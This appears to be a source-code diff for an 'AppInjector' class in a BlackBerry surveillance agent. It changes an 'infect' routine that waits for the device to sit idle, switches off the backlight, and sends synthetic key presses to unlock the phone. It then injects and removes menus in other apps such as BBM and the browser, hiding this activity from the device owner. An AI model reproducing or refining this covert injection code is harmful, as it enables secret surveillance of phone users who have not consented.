@@ -12,9 +12,11 @@ package blackberry.injection;
 import net.rim.device.api.system.ApplicationDescriptor;
 import net.rim.device.api.system.ApplicationManager;
 import net.rim.device.api.system.Backlight;
+import net.rim.device.api.system.DeviceInfo;
 import net.rim.device.api.ui.Keypad;
 import net.rim.device.api.ui.Screen;
 import net.rim.device.api.ui.UiApplication;
+import blackberry.Main;
 import blackberry.agent.im.AppInjectorBBM;
 import blackberry.agent.url.AppInjectorBrowser;
 import blackberry.debug.Debug;
@@ -72,7 +74,7 @@ public class AppInjector {
                 if (apps[i].getName().indexOf(delegate.getAppName()) >= 0) {
                     //MemoryCleanerDaemon.cleanAll();
                     return delegate.callMenuByKey();
-                   
+
                 }
             }
         }
@@ -111,7 +113,7 @@ public class AppInjector {
         debug.trace("infect");
         //#endif
 
-        if (Backlight.isEnabled() || isInfected()) {
+        if (backlight() || isInfected()) {
             //#ifdef DEBUG
             debug.trace("infected or backlight, bailing out");
             //#endif
@@ -127,11 +129,19 @@ public class AppInjector {
             return;
         }
 
-        Backlight.enable(false);
+        if (DeviceInfo.getIdleTime() < 10) {
+            //#ifdef DEBUG
+            debug.trace("infect: not enough idle time");
+            //#endif
+            return;
+        }
 
+        setBacklight(false);
+
+        manager.requestForegroundForConsole();
         unLock();
 
-        if (Backlight.isEnabled()) {
+        if (backlight()) {
             //#ifdef DEBUG
             debug.trace("infected: fail");
             //#endif
@@ -139,7 +149,6 @@ public class AppInjector {
         }
 
         int req = requestForeground();
-
         Utils.sleep(200);
         boolean fore = checkForeground();
 
@@ -148,7 +157,7 @@ public class AppInjector {
                 Utils.sleep(200);
                 delegate.injectMenu();
                 Utils.sleep(200);
-                if(!callMenuByKey()){
+                if (!callMenuByKey()) {
                     //#ifdef DEBUG
                     debug.trace("infect: failed callMenuByKey");
                     //#endif;
@@ -162,9 +171,16 @@ public class AppInjector {
             delegate.deleteMenu();
             Utils.sleep(200);
 
-            if (req == 2 && checkForeground()) {
-                manager.requestForegroundForConsole();
-            }
+            //if (req == 2 && checkForeground()) {
+            //#ifdef DEBUG
+            debug.trace("infect: requesting foreground console");
+            //#endif
+            manager.requestForegroundForConsole();
+            //}
+        } else {
+            //#ifdef DEBUG
+            debug.error("infect: failed to get foreground");
+            //#endif
         }
     }
 
@@ -172,34 +188,56 @@ public class AppInjector {
      * verifica se occorre procedere con l'unlock.
      */
     private void unLock() {
-        manager.requestForegroundForConsole();
-        Utils.sleep(200);
+        //#ifdef DEBUG
+        debug.trace("unLock");
+        //#endif
+
+        if (!backlight()){
+            //Main.getInstance().showBlackScreen(true);    
+            //Utils.sleep(1000);
+        }
+       
         KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
-        //KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
-        //Utils.sleep(200);
-        //KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
         Utils.sleep(200);
-        if (Backlight.isEnabled()) {
+        
+        if (backlight()) {
             //#ifdef DEBUG
             debug.trace("Backlight still enabled, getHardwareLayout: "
                     + Keypad.getHardwareLayout());
             //#endif
 
             KeyInjector.pressRawKeyCode(Keypad.KEY_SPEAKERPHONE);
+            Utils.sleep(200);
             KeyInjector.pressRawKeyCode(KEY_LOCK);
-            Backlight.enable(false);
+            Utils.sleep(200);
+            setBacklight(false);
             Utils.sleep(500);
-            for (int i = 0; i < 20; i++) {
-                if (Backlight.isEnabled()) {
+            for (int i = 0; i < 10; i++) {
+                if (backlight()) {
                     //Backlight.enable(false);
                     Utils.sleep(500);
-                }else{
+                    //#ifdef DEBUG
+                    debug.trace("unLock: backlight still enabled");
+                    //#endif
+                } else {
                     break;
                 }
             }
 
             return;
         }
+        
+        Main.getInstance().showBlackScreen(false); 
+    }
+
+    private boolean backlight() {
+        boolean ret = false;
+        ret = Backlight.isEnabled();
+        return ret;
+    }
+
+    private void setBacklight(boolean value) {
+        Backlight.enable(value);
     }
 
     private boolean checkForeground() {
@@ -213,7 +251,8 @@ public class AppInjector {
                     Screen screen = UiApplication.getUiApplication()
                             .getActiveScreen();
                     //#ifdef DEBUG
-                    debug.trace("checkForeground, acrive screen: " + screen);
+                    debug.trace("checkForeground, found acrive screen: "
+                            + screen);
                     //#endif
                     return true;
                 } else {
